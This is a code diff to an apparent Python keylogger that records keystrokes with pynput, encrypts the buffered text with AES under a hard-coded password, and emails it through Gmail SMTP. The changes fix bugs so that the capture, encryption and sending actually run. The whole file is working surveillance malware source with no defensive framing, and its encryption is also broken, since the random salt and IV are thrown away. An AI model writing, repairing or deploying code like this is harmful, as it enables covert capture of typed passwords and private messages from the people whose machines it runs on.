@@ -10,6 +10,7 @@ from pynput.keyboard import Key, Listener
 
 
 
+
 # Logo
 print ("""================================================================""")
 print (r"""
@@ -23,15 +24,16 @@ print (r"""
 print ("""================================================================""")
 print(""" By: CTC """)
 
-#Asks for input, then logs in to a mail account and sends the input to itself (Disable google authentication or it doesn't work)
+#Asks user for input, then sets up a mail account to send the input to
 #Resource from: https://realpython.com/python-send-email/
 email = input('Enter Your Email: ')
 password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
-#Building the keylogger function
+#building the keylogger function
 data_to_be_encrypted = ''
+data_to_be_sent = ''
 full_log = ''
 word = ''
 email_char_lim = 10
@@ -41,14 +43,20 @@ def on_press(key):
     global full_log
     global email
     global email_char_lim
+    global data_to_be_encrypted
     if key == Key.space or key == Key.enter:
         word += ' '
         full_log += word
         word = ''
     if len(full_log) >= email_char_lim:
-            full_log = data_to_be_encrypted
+            data_to_be_encrypted = full_log
+            print(full_log)
             full_log = ''
-    elif key == Key.shift_1 or key == Key.shift_r:
+            if len(data_to_be_encrypted) >= email_char_lim:
+               encryption()
+               data_to_be_encrypted = ''
+           
+    elif key == Key.shift_l or key == Key.shift_r:
            return
     elif key == Key.backspace:
       word = word[:-1]
@@ -62,25 +70,29 @@ def on_press(key):
 
 #Encryption function
 
-# We derive a 256-bit AES encryption key from the password
-password = "passw0rd"
-passwordSalt = os.urandom(16)
-key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
-
-# Encrypts the plaintext with the given key:
-iv = secrets.randbits(256)
-plaintext = data_to_be_encrypted
-aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
-ciphertext = aes.encrypt(plaintext)
-
-#if ciphertext is the same lenght as email_char_limit everything is reseted
-if len(ciphertext) >= email_char_lim:
+def encryption():
+    global data_to_be_sent
+    global data_to_be_encrypted
+    password = "passw0rd"
+    passwordSalt = os.urandom(16)
+    key = pbkdf2.PBKDF2(password, passwordSalt).read(32)
+    iv = secrets.randbits(256)
+    plaintext = data_to_be_encrypted
+    print(data_to_be_encrypted)
+    aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
+    ciphertext = aes.encrypt(plaintext)
+    data_to_be_sent = ciphertext
+    print(ciphertext)
+    
+    if len(data_to_be_sent) >= email_char_lim:
         send_log()
         data_to_be_encrypted = ''
         plaintext = ''
         full_log = ''
-        ciphertext = ''
-     
+        data_to_be_sent = ''
+        print(data_to_be_sent)
+
+#if ciphertext is the same lenght as email_char_limit everything is reseted
 
 
 #This shit ddefines the send_log function 
@@ -88,8 +100,8 @@ def send_log():
     server.sendmail(
           email,
           email,
-          ciphertext
+          data_to_be_sent
      )
-#Listener stuff
+
 with Listener( on_press=on_press ) as listener:
-     listener.join
+      listener.join()
